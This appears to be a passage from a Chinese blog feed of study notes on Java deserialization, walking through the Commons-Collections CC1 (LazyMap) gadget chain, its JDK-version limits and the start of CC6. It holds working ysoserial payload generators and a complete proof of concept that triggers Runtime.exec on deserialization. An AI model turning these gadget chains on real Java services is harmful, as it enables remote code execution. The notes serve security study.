class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>在ysoserial中使用的是LazyMap对<code>transformerChain</code>进行修饰，因为P神的demo已经能大概看懂了，那么现在直接去看ysoserial的CC1吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;; <span class="comment">// 执行的参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">         <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">       <span class="comment">// 实现调用Runtime.getRuntime.exec(command)</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> handler;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和P神的demo主要区别就在<code>lazyMap</code>，还有这里利用了动态代理（对象代理）（如果我没理解错，应该就是前面的动态代理</p>
<p>然后我们也可以看出来<code>TransformedMap</code>和<code>LazyMap</code>的区别就在于，<code>TransformedMap</code>通过put映射而产生回调，但是<code>LazyMap</code>很明显就不是，那么现在来具体分析一下<code>LazyMap</code>的工作流程（雾</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="keyword">super</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">super</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现<code>LazyMap</code>会在get方法会在判断当map不包含<code>key</code>的时候会调用<code>transform</code>方法，并且传入key当作参数，而之前的链子就是调用<code>transform</code>之后达到命令执行的，那么显而易见只要多次调用get方法就应该可以实现</p>
<p>但是要怎么调用<code>get</code>方法呢</p>
<p>我们跟进，试着读一下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>

<p>在<code>Gadgets</code>中利用动态代理实例化AnnotationInvocationHandler从而动态代理且自动调用<code>AnnotationInvocationHandler</code>重写的invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 我们传入的是lazyMap修饰之后的hashMap和Transformer 还有Map.class</span></span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// ANN_INV_HANDLER_CLASS是一个常量，值为AnnotationInvocationHandler完整的类名 </span></span><br><span class="line">    <span class="comment">// 说明这里就相当于是实例化了这个类 然后传入map使得this.memberValues = lazyMap;</span></span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[ <span class="number">0</span> ] = iface;</span><br><span class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih)); <span class="comment">// 动态代理</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>AnnotationInvocationHandler</code>的<code>invoke</code>方法，我们可以发现在这里会调用<code>LazyMap</code>的get方法</p>
<p><del><em>但是这里的参数是怎么传进去的呢？ 打断点调试了一下发现是通过entrySet调用invoke的，但是哪里调用的entrySet从而导致调用的invoke呢？</em></del>（已解决</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>因为比较菜，所以就打断点之后写下步骤：</p>
<p>1.先进入LazyMap的readObject、decorate，使得<code>this.factory=transformerChain;super.map=HashMap()</code></p>
<p>2.<code>super.map = (Map)in.readObject()</code>，打断可以发现，下一个反序列化的类应该是<code>AnnotationInvocationHandler</code>，但是由于是通过反射实例化的，所以没有直接显示出来（大概），进入<code>AnnotationInvocationHandler</code>的readObject，在<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>调用到了<code>LazyMap.entrySet()</code>之后转到<code>entrySet</code></p>
<p>3.之后调用<code>AnnotationInvocationHandler</code>的invoke方法，其中方法名为<code>entrySet</code>，<code>this.memberValues=LazyMap</code>，从而调用LazyMap.get</p>
<p>（之后的就和之前的差不多了，不过这其中有些比较具体的步骤都是我自己打断点调试猜测的，所以如果不正确期待师傅们的指正</p>
</blockquote>
<p><strong>P神更新的demo:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,Class[].class &#125;, </span><br><span class="line">                               <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class,Object[].class &#125;, </span><br><span class="line">                               <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, newObject[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;,</span><br><span class="line">                               <span class="keyword">new</span> String[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span>	ChainedTransformer(transformers);</span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    </span><br><span class="line">    Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br><span class="line">    Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), </span><br><span class="line">                                               <span class="keyword">new</span> Class[] &#123;Map.class&#125;,handler);</span><br><span class="line">    handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize</span></span><br><span class="line">    ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">    oos.writeObject(handler);</span><br><span class="line">    oos.close();</span><br><span class="line">    System.out.println(barr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deserialize</span></span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">    Object o = (Object)ois.readObject();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对比之后可以发现ysoserial的transformers多了<code>new ConstantTransformer(1)</code></p>
<blockquote>
<p>ysoserialPOC的最后才将执行命令的Transformer数组设置到transformerChain中，原因是避免本地生成序列化流的程序执行到命令</p>
</blockquote>
<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>CC1并不适用于高版本的jdk中，在8u321中测试的时候，cc1就不可以了，浅浅分析一下原因</p>
<p>按照ysoserial的Gadget来，最主要部分就是前面调用LazyMap.get的过程，那么我们可以去看一下<code>AnnotationInvocationHandler</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>我们可以发现<code>AnnotationInvocationHandler.readObject()</code>的代码变了（<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">对比</a></p>
<p>这里删去了<code>s.defaultReadObject()</code>，增加了<code>GetField var2 = var1.readFields()</code>，使得在后面获取<code>memberValues</code>的时候获取的值并不是我们需要的<code>LazyMap</code>，从而不能实现invoke的调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error:java.lang.Override missing element entrySet</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField var2 = var1.readFields();</span><br><span class="line">    Class var3 = (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map var4 = (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var6 = var5.memberTypes();</span><br><span class="line">    LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        Entry var9 = (Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="keyword">null</span>;</span><br><span class="line">        Class var12 = (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><blockquote>
<p>意识流碎碎念</p>
</blockquote>
<p>真的花了很长的时间来看CC1，一方面是在审计java的适应期，一方面是大部分时间在上课和补作业（不敢在上课玩电脑的屑</p>
<p>审计下来因为对java的不熟悉，所以有时候一晚上的时间也没能看懂多少，处于一种云里雾里的状态，不过到后来对类越来越熟悉之后就顺畅多了，虽然还是留下了亿点点问题</p>
<p>虽然特地学了一下动态代理，但是在走<code>LazyMap</code>链的时候，还是因为不能理解而卡在怎么才能调用<code>AnnotationInvocationHandler#invoke</code>上好一会</p>
<p>虽然算是走了一遍，但是感觉还是得再过几遍，不过也要开始看下一个Gadget了！（</p>
<p>最后感想，P神不愧是神！</p>
<p>再次特别感谢P神、<a href="https://amiaaaz.github.io/2022/03/23/java-study-notes-03/#lazymap">AmiaaaZ</a>师傅（虽然师傅并不认识我</p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>学习使我快乐得一</tag>
        <tag>CC1</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅲ</title>
    <url>/2022/04/13/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A2/</url>
    <content><![CDATA[<blockquote>
<p>CC6、CC3、RMI简单入门、JNDI入门 （之后先去学一下fastjson反序列化</p>
</blockquote>
<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p>为了解决CC1在高版本jdk中不适用的局限，我们来审计一下没有版本限制的CC6</p>
<span id="more"></span>

<p>这次就先不跟着P神了！</p>
<p>ysoserial的Gadget chain</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        ···</span><br></pre></td></tr></table></figure>

<p>ysoserial poc:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">// 得到被LazyMap装饰的恶意Map</span></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain); </span><br><span class="line">        <span class="comment">// 将lazyMap传给TiedMapEntry 为了后续调用LazyMap.get</span></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);<span class="comment">// key = &quot;foo&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 实例化一个HashMap</span></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>); <span class="comment">// new HashMap(1)</span></span><br><span class="line">        <span class="comment">// 增加一个key 且指向的value为null</span></span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>); <span class="comment">// HashMap.put(&quot;foo&quot;,new Object())  key = &quot;foo&quot; &gt;&gt; key.hashCode</span></span><br><span class="line">        </span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>); <span class="comment">// f = (HashMap)map</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map); <span class="comment">// key = map,key.hashCode()</span></span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> 